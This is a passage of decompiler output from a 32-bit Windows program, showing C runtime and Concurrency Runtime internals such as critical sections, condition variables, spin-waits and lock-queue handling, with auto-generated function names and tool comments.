  return sub_42B1F3(FileName, a2, ShFlag);
}

//----- (0042B29C) --------------------------------------------------------
FILE *__cdecl sub_42B29C(char *FileName, int a2, int ShFlag)
{
  return _fsopen(FileName, (&Mode)[a2], ShFlag);
}

//----- (0042B416) --------------------------------------------------------
_DWORD *__cdecl sub_42B416(int a1)
{
  if ( dword_49209C < 0 )
    goto LABEL_4;
  if ( dword_49209C <= 1 )
  {
    if ( dword_4922BC )
    {
      *(_DWORD *)a1 = &Concurrency::details::stl_critical_section_win7::`vftable';
      unknown_libname_37(a1 + 4);
      return (_DWORD *)a1;
    }
  }
  else if ( dword_49209C != 2 )
  {
LABEL_4:
    *(_DWORD *)a1 = &Concurrency::details::stl_critical_section_concrt::`vftable';
    return sub_42E472((_DWORD *)(a1 + 4));
  }
  if ( !dword_4922A4 )
    goto LABEL_4;
  *(_DWORD *)a1 = &Concurrency::details::stl_critical_section_vista::`vftable';
  __crtInitializeCriticalSectionEx((LPCRITICAL_SECTION)(a1 + 4), 0xFA0u, 0);
  return (_DWORD *)a1;
}
// 42C1F8: using guessed type _DWORD __cdecl unknown_libname_37(_DWORD);
// 46F908: using guessed type void *Concurrency::details::stl_critical_section_vista::`vftable';
// 46F920: using guessed type void *Concurrency::details::stl_critical_section_win7::`vftable';
// 46F938: using guessed type void *Concurrency::details::stl_critical_section_concrt::`vftable';
// 49209C: using guessed type int dword_49209C;
// 4922A4: using guessed type int dword_4922A4;
// 4922BC: using guessed type int dword_4922BC;

//----- (0042B462) --------------------------------------------------------
void sub_42B462()
{
  ;
}
// 404CED: using guessed type _DWORD _guard_check_icall_nop();

//----- (0042B46A) --------------------------------------------------------
void __thiscall sub_42B46A(int this)
{
  DeleteCriticalSection((LPCRITICAL_SECTION)(this + 4));
}

//----- (0042B475) --------------------------------------------------------
signed __int32 __thiscall sub_42B475(int this)
{
  return sub_42EA98((void *)(this + 4));
}

//----- (0042B488) --------------------------------------------------------
int __thiscall sub_42B488(char *this)
{
  return unknown_libname_30(this + 4);
}
// 42BF4A: using guessed type _DWORD __cdecl unknown_libname_30(_DWORD);

//----- (0042B637) --------------------------------------------------------
char __thiscall sub_42B637(void *this)
{
  return sub_42EAC6((signed __int32)this + 4);
}

//----- (0042B68F) --------------------------------------------------------
void __thiscall sub_42B68F(int this)
{
  sub_42EB6F((void *)(this + 4));
}

//----- (0042B697) --------------------------------------------------------
void __thiscall sub_42B697(int this)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)(this + 4));
}

//----- (0042B6A2) --------------------------------------------------------
int __thiscall sub_42B6A2(char *this)
{
  return unknown_libname_38(this + 4);
}
// 42C212: using guessed type _DWORD __cdecl unknown_libname_38(_DWORD);

//----- (0042BC82) --------------------------------------------------------
void __cdecl sub_42BC82(LPCRITICAL_SECTION lpCriticalSection)
{
  LeaveCriticalSection(lpCriticalSection);
}

//----- (0042C3BB) --------------------------------------------------------
void *sub_42C3BB()
{
  return &unk_492330;
}

//----- (0042C7C7) --------------------------------------------------------
_DWORD *__cdecl sub_42C7C7(_DWORD *a1)
{
  if ( dword_49209C < 0 )
    goto LABEL_4;
  if ( dword_49209C <= 1 )
  {
    if ( dword_4922BC )
    {
      *a1 = &Concurrency::details::stl_condition_variable_win7::`vftable';
      unknown_libname_36(a1 + 1);
      return a1;
    }
  }
  else if ( dword_49209C != 2 )
  {
LABEL_4:
    *a1 = &Concurrency::details::stl_condition_variable_concrt::`vftable';
    return sub_42ED1A(a1 + 1);
  }
  if ( !dword_4922A4 )
    goto LABEL_4;
  *a1 = &Concurrency::details::stl_condition_variable_vista::`vftable';
  unknown_libname_36(a1 + 1);
  return a1;
}
// 42C1A9: using guessed type _DWORD __cdecl unknown_libname_36(_DWORD);
// 46FCF4: using guessed type void *Concurrency::details::stl_condition_variable_vista::`vftable';
// 46FD0C: using guessed type void *Concurrency::details::stl_condition_variable_win7::`vftable';
// 46FD24: using guessed type void *Concurrency::details::stl_condition_variable_concrt::`vftable';
// 49209C: using guessed type int dword_49209C;
// 4922A4: using guessed type int dword_4922A4;
// 4922BC: using guessed type int dword_4922BC;

//----- (0042C813) --------------------------------------------------------
void __thiscall sub_42C813(_DWORD *this)
{
  sub_42ED96(this + 1);
}

//----- (0042C8E3) --------------------------------------------------------
void __thiscall sub_42C8E3(_DWORD *this)
{
  sub_42F4F1(this + 1);
}

//----- (0042C8EB) --------------------------------------------------------
int __thiscall sub_42C8EB(char *this)
{
  return unknown_libname_42(this + 4);
}
// 42C2F5: using guessed type _DWORD __cdecl unknown_libname_42(_DWORD);

//----- (0042C8F6) --------------------------------------------------------
void __thiscall sub_42C8F6(_DWORD *this)
{
  sub_42F55C(this + 1);
}

//----- (0042C8FE) --------------------------------------------------------
int __thiscall sub_42C8FE(char *this)
{
  return unknown_libname_43(this + 4);
}
// 42C30F: using guessed type _DWORD __cdecl unknown_libname_43(_DWORD);

//----- (0042C9F5) --------------------------------------------------------
int __cdecl sub_42C9F5(int a1, _Mtx_t a2)
{
  return unknown_libname_44(a1, a2, 0);
}

//----- (0042CB3D) --------------------------------------------------------
int __thiscall sub_42CB3D(int this)
{
  sub_42CB90((_DWORD *)this);
  *(_DWORD *)this = 56;
  *(_DWORD *)(this + 8) = 0x400000;
  *(_DWORD *)(this + 4) = 0x400000;
  *(_DWORD *)(this + 12) = 3584;
  *(_DWORD *)(this + 16) = &unk_470C20;
  if ( sub_401590((LPCRITICAL_SECTION)(this + 20)) < 0 )
  {
    if ( IsDebuggerPresent() )
      OutputDebugStringW(L"ERROR : Unable to initialize critical section in CAtlBaseModule\n");
    byte_493108 = 1;
  }
  return this;
}
// 493108: using guessed type char byte_493108;

//----- (0042CB90) --------------------------------------------------------
_DWORD *__thiscall sub_42CB90(_DWORD *this)
{
  _DWORD *result; // eax

  memset(this + 5, 0, 0x18u);
  this[11] = 0;
  this[12] = 0;
  result = this;
  this[13] = 0;
  return result;
}

//----- (0042CF7C) --------------------------------------------------------
void __cdecl sub_42CF7C(void *Block)
{
  j_j___free_base(Block);
}

//----- (0042CF8A) --------------------------------------------------------
_DWORD *__thiscall sub_42CF8A(_DWORD *Block, char a2)
{
  *Block = &type_info::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 470CB8: using guessed type void *type_info::`vftable';

//----- (0042D1BE) --------------------------------------------------------
void sub_42D1BE()
{
  InitializeSListHead(&stru_492448);
}

//----- (0042D27E) --------------------------------------------------------
int sub_42D27E()
{
  __scrt_initialize_default_local_stdio_options();
  return 0;
}
// 42E0FA: using guessed type int __scrt_initialize_default_local_stdio_options(void);

//----- (0042D286) --------------------------------------------------------
int sub_42D286()
{
  int v0; // eax

  sub_42DFCB();
  v0 = UserMathErrorFunction();
  return _set_new_mode(v0);
}

//----- (0042DA63) --------------------------------------------------------
unsigned __int64 __usercall sub_42DA63@<edx:eax>(unsigned __int64 a1@<edx:eax>)
{
  int v1; // ecx
  bool v2; // cc
  char v3; // cl

  v1 = HIDWORD(a1) >> 20;
  HIDWORD(a1) = HIDWORD(a1) & 0xFFFFF | 0x100000;
  v2 = v1 < 1075;
  v3 = v1 - 51;
  if ( v2 )
    return a1 >> (-v3 & 0x1F);
  else
    return a1 << (v3 & 0x1F);
}

//----- (0042DC1B) --------------------------------------------------------
void __cdecl sub_42DC1B(void *Block)
{
  j_j_j___free_base(Block);
}

//----- (0042DFCB) --------------------------------------------------------
LPTOP_LEVEL_EXCEPTION_FILTER sub_42DFCB()
{
  return SetUnhandledExceptionFilter(__scrt_unhandled_exception_filter);
}

//----- (0042E02D) --------------------------------------------------------
void sub_42E02D()
{
  dword_49245C = 0;
}
// 49245C: using guessed type int dword_49245C;

//----- (0042E0F4) --------------------------------------------------------
void *sub_42E0F4()
{
  return &unk_492460;
}

//----- (0042E117) --------------------------------------------------------
BOOL sub_42E117()
{
  return dword_48C334 == 0;
}
// 48C334: using guessed type int dword_48C334;

//----- (0042E123) --------------------------------------------------------
void *sub_42E123()
{
  return &unk_493424;
}

//----- (0042E129) --------------------------------------------------------
void *sub_42E129()
{
  return &unk_493420;
}

//----- (0042E12F) --------------------------------------------------------
void sub_42E12F()
{
  ;
}
// 42E12F: could not find valid save-restore pair for edi

//----- (0042E15B) --------------------------------------------------------
void __cdecl sub_42E15B()
{
  ;
}
// 42E15B: could not find valid save-restore pair for edi

//----- (0042E3BD) --------------------------------------------------------
HANDLE *__thiscall sub_42E3BD(HANDLE *Parameter, DWORD DueTime)
{
  HANDLE *v3; // edi
  void *v4; // eax
  void *v5; // eax
  _DWORD pExceptionObject[3]; // [esp+Ch] [ebp-Ch] BYREF

  Parameter[1] = 0;
  v3 = Parameter + 3;
  Parameter[2] = HANDLE_FLAG_INHERIT;
  Parameter[3] = 0;
  Parameter[4] = 0;
  Parameter[5] = 0;
  *Parameter = sub_42E59B();
  if ( DueTime != -1 )
  {
    if ( sub_43268A() < 3 )
    {
      v5 = (void *)sub_42EFCB();
      v4 = (void *)sub_42FDC8(v3, v5, (WAITORTIMERCALLBACK)sub_42E623, Parameter, DueTime, 0, 0x20u);
    }
    else
    {
      v4 = (void *)sub_4303D0(DueTime, (int)sub_42E5DC, (int)Parameter, 0);
      *v3 = v4;
    }
    if ( !v4 )
    {
      sub_4295F3(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
  }
  return Parameter;
}
// 43268A: using guessed type int sub_43268A(void);
// 42E3BD: using guessed type _DWORD pExceptionObject[3];

//----- (0042E44D) --------------------------------------------------------
LPCRITICAL_SECTION __thiscall sub_42E44D(LPCRITICAL_SECTION lpCriticalSection)
{
  sub_430023(lpCriticalSection, dwSpinCount);
  return lpCriticalSection;
}

//----- (0042E462) --------------------------------------------------------
_DWORD *__thiscall sub_42E462(_DWORD *this)
{
  _DWORD *result; // eax

  *this = 0;
  result = this;
  this[1] = 0;
  return result;
}

//----- (0042E472) --------------------------------------------------------
_DWORD *__thiscall sub_42E472(_DWORD *this)
{
  this[6] = 0;
  this[7] = 0;
  *this = 0;
  this[1] = 0;
  this[3] = 0;
  this[2] = 2;
  this[4] = 0;
  this[5] = 0;
  return this;
}

//----- (0042E492) --------------------------------------------------------
std::exception *__thiscall sub_42E492(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::improper_lock::`vftable';
  return this;
}
// 470D34: using guessed type void *Concurrency::improper_lock::`vftable';

//----- (0042E4AD) --------------------------------------------------------
int *__thiscall sub_42E4AD(int *this, int a2)
{
  volatile signed __int32 *v3; // esi

  v3 = this + 1;
  *this = a2;
  sub_42E3BD(this + 1, 0xFFFFFFFF);
  sub_42E7C1(*this, v3, 1);
  return this;
}

//----- (0042E4D7) --------------------------------------------------------
void __thiscall sub_42E4D7(LPCRITICAL_SECTION lpCriticalSection)
{
  DeleteCriticalSection(lpCriticalSection);
}

//----- (0042E4DF) --------------------------------------------------------
void __thiscall sub_42E4DF(void **this)
{
  sub_42EB6F(*this);
}

//----- (0042E515) --------------------------------------------------------
int __thiscall sub_42E515(_DWORD *this, unsigned int a2)
{
  int v3; // edi
  unsigned int v4; // edx
  unsigned int v5; // edi
  _DWORD v7[4]; // [esp+8h] [ebp-10h] BYREF

  v3 = sub_43268F();
  if ( (this[2] & 4) == 0 )
  {
    v4 = (this[2] & 2) != 0 ? (this[2] >> 3) - (a2 >> 3) : 1;
    v5 = v3 + 2;
    if ( v4 <= v5 )
    {
      v7[2] = 0;
      v7[3] = sub_43055D;
      sub_42E8D6(v7, dwSpinCount + dwSpinCount * (v4 - 1) / v5);
      while ( (this[2] & 1) != 0 && sub_42E97E(v7) )
        ;
    }
  }
  return sub_4306A8();
}

//----- (0042E59B) --------------------------------------------------------
_DWORD *sub_42E59B()
{
  _DWORD *result; // eax

  if ( dword_48C354 >= 0 )
    return sub_435813();
  result = sub_430184(dword_4927F0);
  if ( !result )
    return sub_435813();
  return result;
}
// 48C354: using guessed type int dword_48C354;

//----- (0042E5BD) --------------------------------------------------------
void __thiscall sub_42E5BD(volatile signed __int32 *Block)
{
  if ( *((_DWORD *)Block + 3) )
  {
    if ( _InterlockedIncrement(Block + 5) == 2 )
      sub_42CF7C((void *)Block);
  }
}

//----- (0042E5DC) --------------------------------------------------------
HMODULE __stdcall sub_42E5DC(int a1, volatile signed __int32 *Block, int a3)
{
  if ( _InterlockedCompareExchange(Block + 4, 2, 0) )
    sub_42E5BD(Block);
  else
    (*(void (__thiscall **)(volatile signed __int32))(**(_DWORD **)Block + 12))(*Block);
  return sub_430468(a1, a3);
}

//----- (0042E623) --------------------------------------------------------
void __stdcall sub_42E623(volatile signed __int32 *Block, int a2)
{
  void *v2; // esi
  void *v3; // eax

  v2 = (void *)*((_DWORD *)Block + 3);
  v3 = (void *)sub_42EFCB();
  sub_42FDE8(v3, v2, 0);
  if ( _InterlockedCompareExchange(Block + 4, 2, 0) )
    sub_42E5BD(Block);
  else
    (*(void (__thiscall **)(volatile signed __int32))(**(_DWORD **)Block + 12))(*Block);
}

//----- (0042E671) --------------------------------------------------------
void __thiscall sub_42E671(volatile signed __int32 *Block)
{
  if ( *((_DWORD *)Block + 3) )
  {
    if ( _InterlockedExchange(Block + 4, 1) == 2 )
    {
      sub_4306A8();
      sub_42E5BD(Block);
    }
  }
}

//----- (0042E696) --------------------------------------------------------
char __thiscall sub_42E696(volatile signed __int32 *this)
{
  if ( _InterlockedCompareExchange(this + 4, 1, 0) )
    return 0;
  *((_DWORD *)this + 2) &= ~1u;
  (*(void (__thiscall **)(volatile signed __int32))(**(_DWORD **)this + 12))(*this);
  return 1;
}

//----- (0042E6C8) --------------------------------------------------------
_DWORD *__thiscall sub_42E6C8(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  unsigned int v3; // ebx

  result = (_DWORD *)(this[2] >> 1);
  if ( (this[2] & 2) == 0 )
  {
    result = (_DWORD *)(a2[2] >> 1);
    if ( (a2[2] & 2) != 0 )
    {
      v3 = (a2[2] + 8) & 0xFFFFFFFA;
      if ( (a2[2] & 1) != 0
        && ((a2[2] & 4) != 0 || !a2[3] && (*(unsigned __int8 (__thiscall **)(_DWORD))(*(_DWORD *)*a2 + 16))(*a2)) )
      {
        v3 |= 4u;
      }
      result = this;
      this[2] |= v3;
    }
  }
  return result;
}

//----- (0042E730) --------------------------------------------------------
int __thiscall sub_42E730(_DWORD *this)
{
  int result; // eax
  char v3[8]; // [esp+4h] [ebp-10h] BYREF
  int v4; // [esp+Ch] [ebp-8h]
  int (*v5)(); // [esp+10h] [ebp-4h]

  result = this[1];
  v4 = 0;
  v5 = sub_43055D;
  while ( !result )
  {
    sub_42E8F5((int)v3);
    result = this[1];
  }
  return result;
}
// 42E730: using guessed type char var_10[8];

//----- (0042E75B) --------------------------------------------------------
void __thiscall sub_42E75B(LPCRITICAL_SECTION lpCriticalSection)
{
  EnterCriticalSection(lpCriticalSection);
}

//----- (0042E763) --------------------------------------------------------
signed __int32 __thiscall sub_42E763(volatile signed __int32 *this)
{
  int *v2; // edi
  signed __int32 v3; // edx
  signed __int32 result; // eax

  v2 = (int *)(this + 1);
  while ( 1 )
  {
    if ( *v2 > 0 )
      sub_42EA5B(v2, 0, -1);
    v3 = *this;
    if ( *this != -1 )
    {
      result = _InterlockedCompareExchange(this, v3 + 1, v3);
      if ( result == v3 )
        break;
    }
  }
  return result;
}

//----- (0042E793) --------------------------------------------------------
signed __int32 __thiscall sub_42E793(volatile signed __int32 *this)
{
  signed __int32 result; // eax

  _InterlockedIncrement(this + 1);
  for ( result = _InterlockedCompareExchange(this, -1, 0); result; result = _InterlockedCompareExchange(this, -1, 0) )
    sub_42EA5B(this, 0, -1);
  return result;
}

//----- (0042E7C1) --------------------------------------------------------
bool __thiscall sub_42E7C1(int this, volatile signed __int32 *Block, char a3)
{
  _DWORD *v4; // ebx
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  if ( *Block == *(_DWORD *)this )
  {
    sub_4305A6((std::exception *)pExceptionObject, "Lock already taken");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_lock_Concurrency__);
  }
  v4 = (_DWORD *)_InterlockedExchange((volatile __int32 *)(this + 28), (__int32)Block);
  if ( v4 )
  {
    sub_42E6C8(Block, v4);
    v4[1] = Block;
    sub_42E515(Block, *(_DWORD *)(this + 8));
    if ( *((_DWORD *)Block + 4) != 2 )
      sub_42E6C8(Block, (_DWORD *)this);
  }
  else
  {
    *(_DWORD *)(this + 24) = Block;
    sub_42E6C8(Block, (_DWORD *)this);
    *((_DWORD *)Block + 2) &= ~1u;
    sub_42E671(Block);
  }
  if ( a3 )
  {
    *(_DWORD *)(this + 8) = *((_DWORD *)Block + 2);
    *(_DWORD *)(this + 4) = *((_DWORD *)Block + 1);
    *(_DWORD *)this = *Block;
    *(_DWORD *)(this + 24) = Block;
  }
  return *((_DWORD *)Block + 4) != 2;
}

//----- (0042E85C) --------------------------------------------------------
int __thiscall sub_42E85C(int *this)
{
  int *v1; // ecx
  int result; // eax

  v1 = this + 1;
  if ( *v1 > 0 )
    return sub_42EA5B(v1, 0, -1);
  return result;
}

//----- (0042E872) --------------------------------------------------------
void __thiscall sub_42E872(_DWORD *this)
{
  if ( this[7] )
  {
    sub_42EA98();
    sub_42EB6F(this);
  }
}
// 42EA98: using guessed type int sub_42EA98(void);

//----- (0042E88A) --------------------------------------------------------
#error "42E88A: call analysis failed (funcsize=8)"

//----- (0042E8A1) --------------------------------------------------------
void __thiscall sub_42E8A1(LPCRITICAL_SECTION lpCriticalSection)
{
  LeaveCriticalSection(lpCriticalSection);
}

//----- (0042E8A9) --------------------------------------------------------
void __thiscall sub_42E8A9(volatile signed __int32 *this)
{
  _InterlockedDecrement(this);
}

//----- (0042E8AD) --------------------------------------------------------
void __thiscall sub_42E8AD(volatile signed __int32 *this)
{
  *this = 0;
  _InterlockedDecrement(this + 1);
}

//----- (0042E8B8) --------------------------------------------------------
int __thiscall sub_42E8B8(_DWORD *this, int a2)
{
  int result; // eax

  if ( a2 )
  {
    *this = a2;
    result = 1;
    this[1] = 1;
  }
  else
  {
    result = 4;
  }
  this[2] = result;
  return result;
}

//----- (0042E8D6) --------------------------------------------------------
int __thiscall sub_42E8D6(_DWORD *this, int a2)
{
  int result; // eax

  if ( a2 )
  {
    this[1] = 0;
    *this = a2;
    result = 1;
  }
  else
  {
    result = 4;
  }
  this[2] = result;
  return result;
}

//----- (0042E8F5) --------------------------------------------------------
char __thiscall sub_42E8F5(int this)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v5; // eax
  bool v7; // zf

  while ( 1 )
  {
    v2 = *(_DWORD *)(this + 8);
    if ( v2 )
      break;
    *(_DWORD *)(this + 8) = 0;
    sub_42E8B8((_DWORD *)this, dwSpinCount);
  }
  v3 = v2 - 1;
  if ( !v3 )
  {
    _mm_pause();
    v7 = (*(_DWORD *)this)-- == 1;
    if ( v7 )
      *(_DWORD *)(this + 8) = 3 - (*(_DWORD *)(this + 4) != 0);
    return 1;
  }
  v4 = v3 - 1;
  if ( !v4 )
  {
    v7 = (*(_DWORD *)(this + 4))-- == 1;
    if ( v7 )
      *(_DWORD *)(this + 8) = 3;
    (*(void (__thiscall **)(_DWORD))(this + 12))(*(_DWORD *)(this + 12));
    return 1;
  }
  v5 = v4 - 1;
  if ( v5 )
  {
    if ( v5 == 1 )
      (*(void (__thiscall **)(_DWORD))(this + 12))(*(_DWORD *)(this + 12));
  }
  else
  {
    *(_DWORD *)(this + 8) = 0;
    sub_42E8B8((_DWORD *)this, dwSpinCount);
  }
  return 0;
}

//----- (0042E97E) --------------------------------------------------------
char __thiscall sub_42E97E(_DWORD *this)
{
  char v2; // bl
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  bool v8; // zf

  v2 = 0;
  while ( 1 )
  {
    v3 = this[2];
    if ( v3 )
      break;
    this[2] = 0;
    sub_42E8D6(this, dwSpinCount);
  }
  v4 = v3 - 1;
  if ( v4 )
  {
    v5 = v4 - 1;
    if ( v5 )
    {
      v6 = v5 - 1;
      if ( !v6 )
      {
        this[2] = 0;
        sub_42E8D6(this, dwSpinCount);
        return 0;
      }
      if ( v6 != 1 )
        return 0;
    }
    else
    {
      v8 = this[1]-- == 1;
      if ( v8 )
        this[2] = 3;
      v2 = 1;
    }
    _mm_pause();
    return v2;
  }
  else
  {
    _mm_pause();
    v8 = (*this)-- == 1;
    if ( v8 )
      this[2] = 3 - (this[1] != 0);
    return 1;
  }
}

//----- (0042E9F5) --------------------------------------------------------
signed __int32 __thiscall sub_42E9F5(signed __int32 this, signed __int32 *a2)
{
  bool v3; // zf
  signed __int32 result; // eax

  *(_DWORD *)(this + 8) = a2[2];
  *(_DWORD *)(this + 4) = a2[1];
  v3 = *(_DWORD *)(this + 4) == 0;
  result = *a2;
  *(_DWORD *)this = *a2;
  if ( v3 )
  {
    result = _InterlockedCompareExchange((volatile signed __int32 *)(this + 28), this, (signed __int32)a2);
    if ( (signed __int32 *)result != a2 )
    {
      sub_42E730(a2);
      *(_DWORD *)(this + 8) = a2[2];
      *(_DWORD *)(this + 4) = a2[1];
      result = *a2;
      *(_DWORD *)this = *a2;
    }
  }
  *(_DWORD *)(this + 24) = this;
  return result;
}

//----- (0042EA44) --------------------------------------------------------
char __thiscall sub_42EA44(volatile signed __int32 *this)
{
  if ( _InterlockedCompareExchange(this, -1, 0) )
    return 0;
  _InterlockedIncrement(this + 1);
  return 1;
}

//----- (0042EA5B) --------------------------------------------------------
int __cdecl sub_42EA5B(_DWORD *a1, int a2, int a3)
{
  int v3; // esi
  int v4; // edx
  int v5; // ecx
  int result; // eax

  v3 = 10;
LABEL_6:
  v5 = 0;
  while ( 1 )
  {
    result = a3 & *a1;
    if ( result == a2 )
      return result;
    v4 = v3;
    _mm_pause();
    if ( ++v5 >= dwSpinCount )
    {
      if ( v3 > 0 )
        --v3;
      sub_430125(v4 <= 0);
      goto LABEL_6;
    }
  }
}

//----- (0042EA98) --------------------------------------------------------
signed __int32 __thiscall sub_42EA98(void *this)
{
  HANDLE Parameter[6]; // [esp+4h] [ebp-18h] BYREF

  sub_42E3BD(Parameter, 0xFFFFFFFF);
  sub_42E7C1((int)this, (volatile signed __int32 *)Parameter, 0);
  return sub_42E9F5((signed __int32)this, (signed __int32 *)Parameter);
}
// 42EA98: using guessed type HANDLE Parameter[6];

//----- (0042EAC6) --------------------------------------------------------
char __thiscall sub_42EAC6(signed __int32 this)
{
  HANDLE Parameter[2]; // [esp+8h] [ebp-18h] BYREF
  int v4; // [esp+10h] [ebp-10h]

  sub_42E3BD(Parameter, 0xFFFFFFFF);
  if ( _InterlockedCompareExchange((volatile signed __int32 *)(this + 28), (signed __int32)Parameter, 0) )
    return 0;
  *(_DWORD *)(this + 24) = Parameter;
  sub_42E6C8(Parameter, (_DWORD *)this);
  v4 &= ~1u;
  sub_42E9F5(this, (signed __int32 *)Parameter);
  return 1;
}
// 42EAC6: using guessed type HANDLE Parameter[2];

//----- (0042EB11) --------------------------------------------------------
char __thiscall sub_42EB11(void *this, DWORD DueTime)
{
  HANDLE *v3; // eax
  char v4; // bl
  signed __int32 *v5; // esi

  v3 = (HANDLE *)operator new(0x18u);
  v4 = 0;
  if ( v3 )
    v5 = (signed __int32 *)sub_42E3BD(v3, DueTime);
  else
    v5 = 0;
  if ( sub_42E7C1((int)this, v5, 0) )
  {
    sub_42E9F5((signed __int32)this, v5);
    v4 = 1;
  }
  sub_42E5BD(v5);
  return v4;
}

//----- (0042EB6F) --------------------------------------------------------
void __thiscall sub_42EB6F(void *this)
{
  _DWORD *v2; // ecx
  int v3; // esi
  volatile signed __int32 *v4; // ebx

  v2 = (_DWORD *)*((_DWORD *)this + 6);
  *(_DWORD *)this = 0;
  v3 = v2[1];
  *((_DWORD *)this + 6) = v3;
  if ( v3
    || (_DWORD *)_InterlockedCompareExchange((volatile signed __int32 *)this + 7, 0, (signed __int32)v2) != v2
    && (v3 = sub_42E730(v2), (*((_DWORD *)this + 6) = v3) != 0) )
  {
    do
    {
      if ( sub_42E696((volatile signed __int32 *)v3) )
        break;
      v4 = (volatile signed __int32 *)v3;
      v3 = *(_DWORD *)(v3 + 4);
      *((_DWORD *)this + 6) = v3;
      if ( !v3
        && (volatile signed __int32 *)_InterlockedCompareExchange(
                                        (volatile signed __int32 *)this + 7,
                                        0,
                                        (signed __int32)v4) != v4 )
      {
        v3 = sub_42E730(v4);
        *((_DWORD *)this + 6) = v3;
      }
      sub_42E5BD(v4);
    }
    while ( v3 );
  }
}

//----- (0042EBE0) --------------------------------------------------------
int __thiscall sub_42EBE0(int this, int a2, char a3, unsigned __int8 a4)
{
  int result; // eax

  sub_42ECFA((_DWORD *)this);
  *(_DWORD *)(this + 24) = a2 + a4;
  *(_DWORD *)this = &Concurrency::details::MultiWaitBlock::`vftable';
  *(_DWORD *)(this + 12) = 0;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 0;
  *(_DWORD *)(this + 32) = 0;
  *(_BYTE *)(this + 40) = a3;
  result = this;
  *(_DWORD *)(this + 36) = 0;
  *(_BYTE *)(this + 41) = 0;
  return result;
}
// 470D84: using guessed type void *Concurrency::details::MultiWaitBlock::`vftable';

//----- (0042EC1C) --------------------------------------------------------
_DWORD *__thiscall sub_42EC1C(_DWORD *this, char a2, int a3, char a4, unsigned __int8 a5)
{
  _DWORD *v6; // ebx
  int v7; // ecx
  int v8; // edx
  int v10; // [esp-4h] [ebp-10h]

  this[5] = 0;
  v10 = 8 * a3 + 48;
  *this = 48;
  this[1] = 8;
  this[2] = v10;
  v6 = (_DWORD *)unknown_libname_45(v10);
  this[3] = v6;
  this[4] = v6;
  if ( a2 )
  {
    sub_42EBE0((int)v6, a3, a4, a5);
    *v6 = &Concurrency::details::WaitAllBlock::`vftable';
    v6[7] = a3;
  }
  else
  {
    sub_42ECD2(v6, a3, a4, a5);
  }
  v7 = *this + this[3];
  if ( a3 )
  {
    v8 = a3;
    do
    {
      *(_DWORD *)(v7 + 4) = this[4];
      v7 += this[1];
      --v8;
    }
    while ( v8 );
  }
  this[6] = a3 + 1 + a5;
  return this;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);
// 470DA0: using guessed type void *Concurrency::details::WaitAllBlock::`vftable';

//----- (0042ECA3) --------------------------------------------------------
int __thiscall sub_42ECA3(int this, char a2)
{
  int result; // eax

  sub_42ECFA((_DWORD *)this);
  *(_DWORD *)this = &Concurrency::details::TimedSingleWaitBlock::`vftable';
  *(_DWORD *)(this + 16) = 0;
  *(_BYTE *)(this + 24) = a2;
  result = this;
  *(_DWORD *)(this + 28) = 0;
  *(_DWORD *)(this + 32) = 0;
  *(_BYTE *)(this + 36) = 0;
  *(_DWORD *)(this + 16) = this;
  return result;
}
// 470DD8: using guessed type void *Concurrency::details::TimedSingleWaitBlock::`vftable';

//----- (0042ECD2) --------------------------------------------------------
_DWORD *__thiscall sub_42ECD2(_DWORD *this, int a2, char a3, unsigned __int8 a4)
{
  _DWORD *result; // eax

  sub_42EBE0((int)this, a2, a3, a4);
  *this = &Concurrency::details::WaitAnyBlock::`vftable';
  result = this;
  this[7] = 1;
  return result;
}
// 470DBC: using guessed type void *Concurrency::details::WaitAnyBlock::`vftable';

//----- (0042ECFA) --------------------------------------------------------
_DWORD *__thiscall sub_42ECFA(_DWORD *this)
{
  this[1] = 0;
  *this = &Concurrency::details::WaitBlock::`vftable';
  this[2] = 0;
  this[1] = sub_4306C5();
  return this;
}
// 4306C5: using guessed type int sub_4306C5(void);
// 470D54: using guessed type void *Concurrency::details::WaitBlock::`vftable';

//----- (0042ED1A) --------------------------------------------------------
_DWORD *__thiscall sub_42ED1A(_DWORD *this)
{
  *this = 0;
  sub_42E472(this + 1);
  return this;
}

//----- (0042ED37) --------------------------------------------------------
_DWORD *__thiscall sub_42ED37(_DWORD *this)
{
  this[1] = 0;
  *this = 0;
  sub_42E472(this + 2);
  return this;
}

//----- (0042ED58) --------------------------------------------------------
void __thiscall sub_42ED58(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax

  v1 = this[1];
  *this = &Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`vftable';
  if ( v1 )
  {
    v2 = (_DWORD *)(v1 - 8);
    if ( *v2 == 56797 )
      j___free_base(v2);
  }
}
// 470DF0: using guessed type void *Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`vftable';

//----- (0042ED78) --------------------------------------------------------
unsigned int __thiscall sub_42ED78(_DWORD *this)
{
  void *v2; // ecx
  unsigned int v3; // eax
  unsigned int result; // eax

  while ( 1 )
  {
    v3 = this[5];
    if ( v3 >= this[6] )
      break;
    v2 = (void *)this[4];
    ++this[5];
    sub_42F05F(v2);
  }
  result = v3 + 1;
  this[5] = result;
  return result;
}

//----- (0042ED96) --------------------------------------------------------
void __thiscall sub_42ED96(_DWORD *this)
{
  sub_42E872(this + 1);
  sub_42F4F1(this);
}
// 404CED: using guessed type _DWORD _guard_check_icall_nop();

//----- (0042EDE2) --------------------------------------------------------
void __thiscall sub_42EDE2(_DWORD *this)
{
  _DWORD **v2; // esi
  _DWORD *v3; // ebx
  _DWORD **v4; // ecx
  _DWORD *v5; // esi

  sub_42E872(this + 2);
  v2 = (_DWORD **)*this;
  if ( *this > 1u )
  {
    do
    {
      v3 = *v2;
      if ( (unsigned __int8)sub_42F0AD((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v2, 0) )
        sub_42EE86(v2);
      v2 = (_DWORD **)v3;
    }
    while ( v3 );
  }
  v4 = (_DWORD **)this[1];
  if ( v4 )
  {
    do
    {
      v5 = *v4;
